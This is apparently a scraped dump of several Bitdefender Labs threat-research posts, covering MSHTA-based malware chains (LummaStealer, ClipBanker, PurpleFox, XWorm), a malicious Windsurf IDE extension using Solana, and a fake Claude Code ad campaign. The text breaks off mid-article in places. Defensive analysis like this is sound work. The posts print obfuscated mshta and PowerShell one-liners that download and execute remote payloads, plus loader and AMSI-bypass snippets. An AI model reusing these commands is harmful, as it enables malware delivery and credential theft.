       if(e4!==64&amp;&amp;e4!==-1) out.push(c3&amp;0xFF);\n    }\n    if(pad&gt;0) out.splice(out.length-pad,pad);\n\n    var rECeQYjgakLNnbZcTJmkoefcDPJScPAz=\"\";\n    for(var x=0;x&lt;out.length;x++){\n        rECeQYjgakLNnbZcTJmkoefcDPJScPAz+=String.fromCharCode(out[x]);\n    }\n    return rECeQYjgakLNnbZcTJmkoefcDPJScPAz;\n}\n\nvar rDiPjSLADFoHqVucyLWWZenMlZdunYAi = &lt;B64_script_redacted_for_size&gt;;\n\nfunction ZGnRfrBcHrSGXLgAhCCMsyQTuwRQHDQT() {\n    var cxabulitGWnsgaALcqJZHzjkKyjdyyyo = HbQIdLwSSIRvbVXZWLOwjRQqttuGTqKP(rDiPjSLADFoHqVucyLWWZenMlZdunYAi);\n    eval(cxabulitGWnsgaALcqJZHzjkKyjdyyyo);\n}\n&lt;\u002Fscript&gt;\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe decoded result is a second-stage loader that includes the same Base64 routine and two decryption functions. The apparent size of this script is misleading, as it includes hundreds of lines of small helper functions that are never actually called.\u003C\u002Fp\u003E\u003Cp\u003EIts purpose is to decrypt a string stored in a global variable and create a WScript.Shell object, and launch the decoded script in that new WScript environment, still under the execution chain initiated by mshta.exe.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Evar cDhmBQsxdNEUHhzpdeyyybZMzVNANXtp = &lt;redacted_encrypted_payload&gt;\nvar LevylKBNaEDCESWQQeQznakYNfOEICxk = &lt;redacted_decryption_key&gt;\nvar VFjTZSncvgnebyEyMwfLTieiopsaYfQZ = &lt;redacted_b64_string&gt;\n\nfunction initMain() {\n    var stg1 = from_base64(VFjTZSncvgnebyEyMwfLTieiopsaYfQZ);\n    var stg2 = VQGTmVqlpKoSesHrvqRZECwHNdrdrDRX(stg1, LevylKBNaEDCESWQQeQznakYNfOEICxk);\n    var EYgUwBZqUyrgJIRdiVDwqyUHlgusmKOr = xor_decrypt(stg2, cDhmBQsxdNEUHhzpdeyyybZMzVNANXtp);\n    var decoded_payload_script = \"\";\n    for(var i=0; manually reversing it is almost impossible. However, with script block logging and some tooling, we can reconstruct the final layer of script that was executed.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-8.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"936\" height=\"394\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-8.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-8.png 936w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe final, deobfuscated version of the PowerShell script consists of two parts. The first one is an AMSI bypass by patching clr.dll, possibly taken from a publicly available GitHub repository [4]. After the AMSI bypass, there is a big Base64-encoded string, followed by three lines of code that decode the Base64 and load the resulting byte array as an assembly.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E$bytes = [System.Convert]::FromBase64String($a);\n[Reflection.Assembly]$assembly = [System.AppDomain]::CurrentDomain.Load($bytes) # Load Assembly\n$assembly.EntryPoint.Invoke($null, @())\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThis loader is most often used to execute commodity malware on the infected system. In the case we analyzed, the assembly that was executed is a well-known LummaStealer assembly (1E0E375F3EE82D5AF5DFE6F7DF0E2FAC9A7D37C67ADD3390D05A93AFD85B7C84) that contains C2 domains associated with the Lumma infrastructure.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-9.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"472\" height=\"476\"\u003E\u003C\u002Ffigure\u003E\u003Ch2 id=\"clipbanker\"\u003EClipBanker\u003C\u002Fh2\u003E\u003Cp\u003EAnother MSHTA-driven cluster in our telemetry involved ClipBanker [8], a malware family primarily designed to steal cryptocurrency by replacing wallet addresses in the victim’s clipboard. In this infection chain, MSHTA serves as an early-stage execution mechanism that launches a remote HTA and then quickly transitions to PowerShell-based persistence and payload delivery.\u003C\u002Fp\u003E\u003Cp\u003EThe HTA executed from the remote location hxxps[:\u002F\u002F]asd[.]s7610rir[.]pw\u002Fwin\u002Fchecking[.]hta is a simple script that hides the MSHTA window by moving it to negative coordinates, creates a Wscript Shell object and runs a Base64-encoded PowerShell command.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E&lt;HTML&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text\u002Fhtml; charset=utf-8\"&gt;\n&lt;HEAD&gt;\n&lt;script language=\"VBScript\"&gt;\n        Window.ReSizeTo 0, 0\n        Window.moveTo -2000,-2000\n        Function var_func()\n                Dim var_shell\n                Set var_shell = CreateObject(\"Wscript.Shell\")\n                var_shell.run \"cmd \u002Fc powershell.exe -w 1 -NoProfile -InputFormat None -ExecutionPolicy Bypass -e &lt;redacted_b64_command&gt;, 0, true\n        End Function\n\n        var_func\n&lt;\u002Fscript&gt;\n&lt;body&gt;\n&lt;\u002Fbody&gt;\n&lt;\u002FHEAD&gt;\n&lt;\u002FHTML&gt;\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe command downloads the second stage from hxxp[:\u002F\u002F]185[.]208[.]159[.]199, which is a Powershell file called checking.ps1 (333E2192F2551415659FB4094E81B911708921BB588EECF65E27F51C9938DFC2). \u003C\u002Fp\u003E\u003Cp\u003EThe role of this script is to ensure Windows Defender exclusions and persistence, which executes the ClipBanker downloader obtained from: hxxp[:\u002F\u002F]87[.]96[.]21[.]84\u002Fichigo-lite[.]ps1 (38FE562136ADE372FC4CEDDE67826AEEA8404E93A54A4A4736DDB4C8C8D4C96D).\u003C\u002Fp\u003E\u003Cp\u003EThe scheduled task names masquerade as services that sound legitimate (e.g., Optimize Start Menu Cache Files-S-3-5-21-2236678155-433529325-1142214968-1237).\u003C\u002Fp\u003E\u003Cp\u003EFinally, a cleanup script gets executed, downloaded from hxxp[:\u002F\u002F]87[.]96[.]21[.]84\u002Fdel[.]ps1 (7D0487AFC91B0FE8B2FBF732AB54C3C07E86BF69471BBA6C283AABEA190499BA). \u003C\u002Fp\u003E\u003Cp\u003EThis script cleans up the files used during the attack and terminates processes that might have been involved in dynamic analysis in a sandbox (e.g., Procmon, Autoruns).\u003C\u002Fp\u003E\u003Ch2 id=\"purplefoxeven-sophisticated-threats-use-mshta\"\u003EPurpleFox - even sophisticated threats use MSHTA\u003C\u002Fh2\u003E\u003Cp\u003EMSHTA is not only used in commodity-stealing and loader campaigns. It also appears in delivery chains associated with PurpleFox [9], a more advanced and persistent malware family that has remained active for years.\u003C\u002Fp\u003E\u003Cp\u003EThis is important because it shows that MSHTA is useful not only for lightweight initial infection stages, but also for malware operations focused on stealth, persistence, and long-term control of the compromised system.\u003C\u002Fp\u003E\u003Cp\u003ESince emerging in 2018, PurpleFox has continued to expand its arsenal and remains active in 2026. One of its long-standing delivery methods, however, has remained consistent: launching msiexec from an MSHTA command line in order to download and execute an MSI package disguised as a .png file.\u003C\u002Fp\u003E\u003Cp\u003EThe command lines are recognizable by the list of IP addresses they attempt to contact and by the .png file that is ultimately executed through msiexec:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.exe vbscript:createobject(\"wscript.shell\").run(\"Cmd \u002Fc for \u002Fd %i in (195[.]189[.]28[.]244:17807 103[.]124[.]106[.]194:18413 58[.]221[.]59[.]20:17256 ) do Msiexec \u002Fi http:\u002F\u002F%i\u002F3EBCE3A4.Png \u002FQ\",0)(window.close)\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EOnce installed, PurpleFox functions as a rootkit-enabled backdoor whose primary objectives are to remain hidden, establish persistence, and execute on-demand commands from its C2 infrastructure. \u003C\u002Fp\u003E\u003Cp\u003EThese capabilities can support a wide range of malicious activity, including information theft, surveillance, and disruptive actions such as DDoS attacks.\u003C\u002Fp\u003E\u003Ch2 id=\"mshta-and-powershellan-intermediary-step-in-multi-stage-attacks\"\u003EMSHTA and PowerShell - an intermediary step in multi-stage attacks\u003C\u002Fh2\u003E\u003Cp\u003EOur telemetry shows multiple smaller clusters of PowerShell executions via MSHTA, where MSHTA creates a wscript shell that runs the PowerShell process to execute the loader responsible for downloading the next stage.\u003C\u002Fp\u003E\u003Cp\u003EWe observed obfuscation techniques unique to each campaign, aiming to mask keywords that trigger alerts in EDRs and SIEMs.\u003C\u002Fp\u003E\u003Cp\u003EThe first category features URLs that appear to link to image files but actually contain a PowerShell script downloaded and executed in memory. These IPs are typically used by XWorm\u002FDanabot. PowerShell keywords are split into multiple tokens to bypass detection.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.exe\" vbscript:close(CreateObject(\"WScript.Shell\").Run(\"powershell $L='(New-Object Net.We';$Y='bClient).Downlo';$V='adString(''http:\u002F\u002F92[.]255[.]57[.]155\u002Fb.jpg'')';$F=I`E`X ($L,$Y,$V -Join '')|I`E`X\",0))\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EA variation of the XWorm command line adds junk characters, which are removed by the String.Replace method.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.exe\" vbscript:close(CreateObject(\"WScript.Shell\").Run(\"powershell IEX(('#!!i!Qw#Q!r #8###5#.!!!2###0!!8#.8###4!!.2!!!0###8!\u002F#x!!!.j###pg# |#i!!e!!!!x#').RePlACE('Q','').REplAcE('!','').rEpLAce('#',''))\",0))\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe next category involves the Lalala information stealer, where the script is delivered only if the POST request to the PHP script includes a predefined password. Other PowerShell keywords remain unobfuscated.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.EXE\" vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell Invoke-Expression -Command:(iwr -uri 185[.]156[.]172[.]22\u002Fgate990.php -method post -body gieM3iR5).content\"\", 0 : window.close\")\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EAnother cluster of PowerShell commands executes scripts previously downloaded in the chain. This delivery method is noisier because it allows scanning the script file for malware.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.EXE\" vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell -ep bypass -File \"\"\"\"C:\\Users\\U_f8d33485bec26b2b1969f910c131f027\\AppData\\Roaming\\Adobe\\peyneKzk2.ps1 \"\"\"\"\"\" ,0:close\")\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe final major category involves command lines where the URL is encoded and stored in local variables. The one-liner decodes the URL and executes the downloaded payload in memory.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.exe\" vbscript:close(CreateObject(\"WScript.Shell\").Run(\"powershell $Z='aXdyIGh0dHBzOi8vMHg0NC5pbmZvL2F8aWV4';$B=[System.Convert]::FromBase64String($Z);$D=[System.Text.Encoding]::UTF8.GetString($B);iex $D\",0))\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch2 id=\"driverpackan-example-of-legitimate-usage\"\u003EDriverPack - an example of legitimate usage\u003C\u002Fh2\u003E\u003Cp\u003ENot every MSHTA execution we observed was clearly malicious. A significant portion of detections came from DriverPack's update mechanism, an older software package that downloads driver files from third-party sources rather than through official Microsoft update channels.\u003C\u002Fp\u003E\u003Cp\u003EAlthough DriverPack is not inherently malicious, many security vendors classify some of its components as potentially unwanted applications (PUA).\u003C\u002Fp\u003E\u003Cp\u003EIn the cases we analyzed, DriverPack used a scheduled task to launch mshta.exe, which then executed an HTA in memory to check for updates or ensure that the latest version of the software was installed.\u003C\u002Fp\u003E\u003Cp\u003EWhile this appears to serve a legitimate software-maintenance purpose, the method is unorthodox and overlaps with techniques commonly used in malicious delivery chains.\u003C\u002Fp\u003E\u003Cp\u003EThis is an important reminder that MSHTA usage is not automatically malicious. At the same time, using MSHTA to retrieve and execute remote content as part of an update workflow is not a recommended design choice, especially when more modern and transparent alternatives are available.\u003C\u002Fp\u003E\u003Ch2 id=\"recommended-user-and-organizational-mitigations\"\u003ERecommended user and organizational mitigations\u003C\u002Fh2\u003E\u003Cp\u003EDefense against MSHTA-related attacks generally falls into two broad categories: user awareness and behavior, and the implementation of technical security controls.\u003C\u002Fp\u003E\u003Cp\u003EMany of the attack chains presented in this article rely on user interaction. In some cases, users are persuaded to download software or media from untrusted websites that promise free or cracked content. In others, they are manipulated through social engineering into willingly executing malicious commands copied to the clipboard. For this reason, user education remains an important line of defense.\u003C\u002Fp\u003E\u003Cp\u003EUsers should be informed about these tactics and regularly reminded of the risks associated with downloading untrusted files, following suspicious instructions, or executing commands they do not fully understand.\u003C\u002Fp\u003E\u003Cp\u003ETechnical mitigations are equally important. MSHTA-based attacks usually do not rely on a single malicious file, but on a chain of script execution, command-line abuse, in-memory stages, and follow-on payload delivery. That is why protection needs to cover multiple points in the attack chain, from attack surface reduction to pre-execution detection and runtime behavioral blocking.\u003C\u002Fp\u003E\u003Cp\u003EBitdefender employs various technologies to detect these attacks as part of its layered defense strategy, all of which are integrated into Bitdefender’s security solutions.\u003C\u002Fp\u003E\u003Cp\u003EUntil Microsoft removes legacy scripting utilities that are still present by default in Windows, users can reduce exposure by ensuring that they run a comprehensive security solution, such as \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-us\u002Fconsumer\u002Fultimate-security\"\u003E\u003Cstrong\u003EBitdefender Ultimate Security\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E\u003Cstrong\u003E.\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EAdditionally, \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-us\u002Fbusiness\u002Fproducts\u002Fthreat-intelligence-solutions?_gl=1*b2kr29*_ga*MTQzMDAyODk0LjE3NzAxOTcwMjY.*_ga_6M0GWNLLWF*czE3Nzc5NjM5Nzkkbzc5JGcxJHQxNzc3OTYzOTg5JGo1MCRsMCRoODc0MzM4NjE5*_gcl_aw*R0NMLjE3NzY0MzAyMTguQ2p3S0NBand0SWZQQmhBekVpd0F2OVJUSnJPRHFwNDJEZmtGLS1CMG9wOWFIRXM3X3dWbTJzeFdMX0tDb010ZnhqSHdEdHNEU25vZkhSb0NYTXNRQXZEX0J3RQ..*_gcl_au*MjAxNjczMTk1OC4xNzc2MjQzODYw*FPAU*MjAxNjczMTk1OC4xNzc2MjQzODYw\" rel=\"noopener noreferrer\"\u003E\u003Cstrong\u003EBitdefender Threat Intelligence Solutions\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E help organizations detect, investigate, and respond to cyber threats faster by providing real-time intelligence on malicious files, URLs, domains, and IPs. Delivered through feeds, APIs, and the IntelliZone portal, the solutions support both security teams and security vendors with actionable threat data, contextual insights, and automated integrations for stronger cybersecurity operations.\u003C\u002Fp\u003E\u003Cp\u003EIn environments where they are no longer required for legitimate workflows, binaries such as wscript.exe and mshta.exe should be location\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd\u003E190[.]111[.]12[.]242\u003C\u002Ftd\u003E\n\u003Ctd\u003EIP\u003C\u002Ftd\u003E\n\u003Ctd\u003EPurpleFox .msi location\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd\u003E193[.]112[.]70[.]226\u003C\u002Ftd\u003E\n\u003Ctd\u003EIP\u003C\u002Ftd\u003E\n\u003Ctd\u003EPurpleFox .msi location\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd\u003E201[.]138[.]238[.]195\u003C\u002Ftd\u003E\n\u003Ctd\u003EIP\u003C\u002Ftd\u003E\n\u003Ctd\u003EPurpleFox .msi location\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd\u003E204[.]44[.]110[.]216\u003C\u002Ftd\u003E\n\u003Ctd\u003EIP\u003C\u002Ftd\u003E\n\u003Ctd\u003EPurpleFox .msi location\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd\u003E222[.]73[.]29[.]92\u003C\u002Ftd\u003E\n\u003Ctd\u003EIP\u003C\u002Ftd\u003E\n\u003Ctd\u003EPurpleFox .msi location\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\n\u003C\u002Ftable\u003E\n",20,"\u002Fblog\u002Flabs\u002Fmicrosofts-mshta-legacy-malware-windows\u002F","69b83560a89a0404d6eab4fc","Windsurf IDE Extension Drops Malware via Solana Blockchain","windsurf-extension-malware-solana","https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F03\u002Fred-star-dreamy-coding-8670014_1920.png","2026-03-18T16:03:55.000+03:00","\u003Cp\u003EBitdefender researchers have discovered a malicious Windsurf IDE (integrated development environment) extension that deploys a multi-stage NodeJS stealer by using the Solana blockchain as the payload infrastructure.\u003C\u002Fp\u003E\u003Cp\u003EThe extension, disguised as an R language support extension for Visual Studio Code, retrieves encrypted JavaScript from blockchain transactions, executes it using NodeJS runtime primitives, drops compiled add-ons to extract Chromium data, all the while establishing persistence with the help of a hidden PowerShell scheduled task.\u003C\u002Fp\u003E\u003Cp\u003EThere’s an official, legitimate extension named \u003Ca href=\"https:\u002F\u002Fmarketplace.visualstudio.com\u002Fitems?itemName=REditorSupport.r\"\u003EREditorSupport\u003C\u002Fa\u003E, which is likely why the attacker used a very similar name to confuse potential victims.\u003C\u002Fp\u003E\u003Cp\u003EThe attack specifically excludes Russian systems and targets developer environments, enabling threat actors to harvest high-value credentials.\u003C\u002Fp\u003E\u003Ch2 id=\"key-takeaways\"\u003EKey takeaways\u003C\u002Fh2\u003E\u003Cul\u003E\n\u003Cli\u003EA fake R language development extension installed inside Windsurf IDE triggers a malware infection.\u003C\u002Fli\u003E\n\u003Cli\u003EThe malicious Windsurf extension hid its true functionality, decrypting its payload only after installation in an effort to avoid detection.\u003C\u002Fli\u003E\n\u003Cli\u003EInstead of using traditional command-and-control servers, the attackers retrieved malicious code from the Solana blockchain, which make takedown efforts significantly harder.\u003C\u002Fli\u003E\n\u003Cli\u003EBefore launching its attack, the malware checked whether the victim was in Russia and shut itself down if so.\u003C\u002Fli\u003E\n\u003Cli\u003EThe goal of the malware is data exfiltration (saved browser passwords, session cookies and other sensitive data) from Chromium-based browsers.\u003C\u002Fli\u003E\n\u003Cli\u003ETo establish persistence, the malware creates a hidden Windows scheduled task relaunching itself through a bundled NodeJS runtime.\u003C\u002Fli\u003E\n\u003Cli\u003EThe campaign intentionally targets developers, who frequently have privileged access, API keys, and other high-value credentials.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch2 id=\"incident-discovery-and-initial-alerts\"\u003EIncident discovery and initial alerts\u003C\u002Fh2\u003E\u003Cp\u003EThe investigation began after Bitdefender EDR generated multiple detections involving a windsurf.exe on a corporate workstation.\u003C\u002Fp\u003E\u003Cp\u003EThe user had installed a Windsurf extension to assist with R development, an environment comparable to MATLAB. The extension was named:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Ereditorsupporter.r-vscode-2.8.8-universal\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe infection did not rely on a standalone executable. Instead, it operated within the IDE’s trusted extension ecosystem, allowing the malicious logic to persist despite endpoint detections tied to the main application process.\u003C\u002Fp\u003E\u003Ch2 id=\"the-malicious-extension-inside-windsurf\"\u003EThe malicious extension inside .windsurf\u003C\u002Fh2\u003E\u003Cp\u003EInvestigators manually examined the Windsurf extension directory:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E.windsurf\u002F\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EInside this location, which stores all IDE extensions, they identified the suspicious package. The extension contained a peculiar JavaScript block that decrypted an embedded payload. The code didn’t contain the final malicious functionality directly. Instead, it acted as a loader.\u003C\u002Fp\u003E\u003Cp\u003EOnce decrypted, the payload revealed a second-stage JavaScript component that initiated environmental checks before proceeding further.\u003C\u002Fp\u003E\u003Ch2 id=\"decrypted-loader-and-system-profiling\"\u003EDecrypted loader and system profiling\u003C\u002Fh2\u003E\u003Cp\u003EThe first action of the decrypted payload was to profile the system. It collected the current username and inspected environment variables, along with locale and timezone information, and calculated the UTC time.\u003C\u002Fp\u003E\u003Cp\u003EThe script explicitly searched for Russian indicators. It looked for language markers or “Russian,” compared the system timezone against known Russian regions including Europe\u002FMoscow, Europe\u002FKaliningrad, Europe\u002FSamara, Asia\u002FYekaterinburg, Asia\u002FOmsk, Asia\u002FKrasnoyarsk, Asia\u002FIrkutsk, Asia\u002FYakutsk, Asia\u002FVladivostok, Asia\u002FMagadan, Asia\u002FKamchatka, Asia\u002FAnadyr, and MSK, and validated whether the UTC offset fell between +2 and +12.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Efunction _isRussianSystem() {\nlet isRussianLanguage = [os.userInfo().username, process.env.LANG, process.env.LANGUAGE, process.env.LC_ALL, Intl.DateTimeFormat().resolvedOptions().locale].some(info =&gt; info &amp;&amp; \u002Fru_RU|ru-RU|Russian|russian\u002Fi.test(info)),\ntimezoneInfo = [Intl.DateTimeFormat().resolvedOptions().timeZone, new Date().toString()],\nrussianTimezones = [\"Europe\u002FMoscow\", \"Europe\u002FKaliningrad\", \"Europe\u002FSamara\", \"Asia\u002FYekaterinburg\", \"Asia\u002FOmsk\",\n\"Asia\u002FKrasnoyarsk\", \"Asia\u002FIrkutsk\", \"Asia\u002FYakutsk\", \"Asia\u002FVladivostok\", \"Asia\u002FMagadan\", \"Asia\u002FKamchatka\", \"Asia\u002FAnadyr\", \"MSK\"\n],\nisRussianTimezone = timezoneInfo.some(info =&gt; info &amp;&amp; russianTimezones.some(tz =&gt; info.toLowerCase().includes(tz.toLowerCase()))),\nutcOffset = -new Date().getTimezoneOffset() \u002F 60,\nisRussianOffset = utcOffset &gt;= 2 &amp;&amp; utcOffset &lt;= 12;\nreturn isRussianLanguage &amp;&amp; (isRussianTimezone || isRussianOffset)\n}\nname(_isRussianSystem, \"_isRussianSystem\");\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EIf the system matched these criteria, execution stopped immediately.\u003C\u002Fp\u003E\u003Cp\u003EThis deliberate exclusion of Russian systems indicates operational safeguards typically associated with financially motivated cybercrime groups seeking to avoid domestic scrutiny.\u003C\u002Fp\u003E\u003Ch2 id=\"solana-rpc-abuse-and-remote-payload-retrieval\"\u003ESolana RPC abuse and remote payload retrieval\u003C\u002Fh2\u003E\u003Cp\u003EBecause the extension runs within a NodeJS environment and is not sandboxed, it can freely interact with the operating system and network stack.\u003C\u002Fp\u003E\u003Cp\u003EAfter passing system profiling checks, the malware initiated POST requests to:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Ehttps:\u002F\u002Fapi.mainnet-beta.solana[.]com\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EIt invoked the Solana JSON-RPC method:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003EgetSignaturesForAddress\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EInstead of contacting a traditional command-and-control (C2) server, the malware used Solana as decentralized infrastructure. It queried blockchain transactions and retrieved encoded data embedded within transaction metadata.\u003C\u002Fp\u003E\u003Cp\u003EWhen the request was completed, the malware received buffers containing JavaScript payload fragments. It decoded and prepared them for execution.\u003C\u002Fp\u003E\u003Ch2 id=\"dynamic-execution-in-a-non-sandboxed-nodejs-context\"\u003EDynamic execution in a non-sandboxed NodeJS context\u003C\u002Fh2\u003E\u003Cp\u003EThe retrieved content consisted of base64-encoded JavaScript layered with AES-encrypted payload components. The loader reconstructed the malicious runtime dynamically.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F03\u002Fimage--10-.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1800\" height=\"1261\" 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EBecause Windsurf extensions operate in a NodeJS environment without strict sandbox isolation, the malware gained direct filesystem access and could id=\"native-node-addons-and-chromium-data-extraction\"\u003ENative .node addons and chromium data extraction\u003C\u002Fh2\u003E\u003Cp\u003EAfter dynamic execution, the malware dropped files into:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003EAppData\\Local\\Temp\\&lt;random_string&gt;\\\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EObserved files included:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Ew.node\u003C\u002Fli\u003E\n\u003Cli\u003Ec_x64.node\u003C\u002Fli\u003E\n\u003Cli\u003Eindex_ia32.node\u003C\u002Fli\u003E\n\u003Cli\u003EDllExtractChromiumSecrets.dll\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThese files are DLLs and are loaded by NodeJS as .node files.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Econst addon = require('C:\u002FUsers\u002F&lt;USER&gt;\u002FAppData\u002FLocal\u002FTemp\u002F&lt;Random_String&gt;\u002Fc_x64.node');\nconst result = addon.extractBrowserData(browser, outputFile, showAll, decryptedData, profile);\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe researcher confirmed that these components function as credential stealers.\u003C\u002Fp\u003E\u003Cp\u003EThese native modules enable:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003EDirect interaction with browser profiles\u003C\u002Fli\u003E\n\u003Cli\u003EExtraction of saved credentials\u003C\u002Fli\u003E\n\u003Cli\u003ERetrieval of cookies and session tokens\u003C\u002Fli\u003E\n\u003Cli\u003EAccess to encrypted Chromium secrets\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch2 id=\"powershell-execution-and-scheduled-task-persistence\"\u003EPowerShell execution and scheduled task persistence\u003C\u002Fh2\u003E\u003Cp\u003EAfter deploying the native stealer modules, the malware invoked PowerShell to achieve persistence.\u003C\u002Fp\u003E\u003Cp\u003EThe PowerShell component hid its console window, leveraged Win32 API calls through Add-Type, and created a scheduled task named:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003EUpdateApp\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe task executed:\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg Ads","fake-claude-code-google-ads-malware","https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F03\u002Fclaude_malvertising.png","2026-03-11T16:04:49.000+03:00","\u003Cp\u003E\u003Cem\u003EBitdefender’s security researchers have discovered a malicious Google Ads campaign that targets anyone looking for downloads related to Claude, the large language model developed by Anthropic.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Ch2 id=\"key-takeaways\"\u003EKey takeaways\u003C\u002Fh2\u003E\u003Cul\u003E\n\u003Cli\u003EA malicious Google ad impersonated Claude Code.\u003C\u002Fli\u003E\n\u003Cli\u003EThe fake site mirrored official Claude Code documentation.\u003C\u002Fli\u003E\n\u003Cli\u003EWindows users executed malware through mshta.exe.\u003C\u002Fli\u003E\n\u003Cli\u003EmacOS users downloaded a Mach-O backdoor via obfuscated shell commands.\u003C\u002Fli\u003E\n\u003Cli\u003EBitdefender detects the Windows payload as Trojan.Stealer.GJ, Trojan.Stealer.GK, IL:Trojan.MSILZilla.245316 and Gen:Variant.Barys.509034\u003C\u002Fli\u003E\n\u003Cli\u003EThe attackers likely abused a compromised advertiser account linked to a Malaysian company.\u003C\u002Fli\u003E\n\u003Cli\u003EThe fake documentation page was hosted on a Squarespace subdomain.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EClaude has been in the news for quite some time, and cybercriminals are capitalizing by anticipating &nbsp;people will be searching for tools and downloads related to this LLM.\u003C\u002Fp\u003E\u003Cp\u003ETo exploit this interest, they bought a convincing sponsored result that shows up above legitimate search results, redirecting victims to a fake documentation page that looks much like the real one.\u003C\u002Fp\u003E\u003Cp\u003EAdditionally, the attackers use one of the most basic tactics to compromise devices: a method called \u003Ca 